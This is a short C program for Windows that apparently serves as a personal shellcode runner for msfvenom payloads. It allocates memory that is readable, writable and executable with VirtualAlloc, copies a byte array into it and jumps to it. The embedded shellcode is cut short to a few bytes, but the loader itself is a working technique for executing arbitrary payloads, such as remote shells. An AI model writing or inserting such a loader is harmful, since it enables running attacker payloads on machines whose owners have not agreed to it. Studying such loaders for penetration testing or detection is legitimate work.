// Simple execution of shellcode, probably from msfvenom
// Note to self, if you're using Visual Studio, change the architecture to x86 if you used 32bit msfvenom shellcode like windows/exec
#include "Windows.h"

int main()
{
	unsigned char shellcode[] = "\xeb\x01\x21\xe8\...";

	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcode, sizeof shellcode);
	((void(*)())exec)();

	return 0;
}
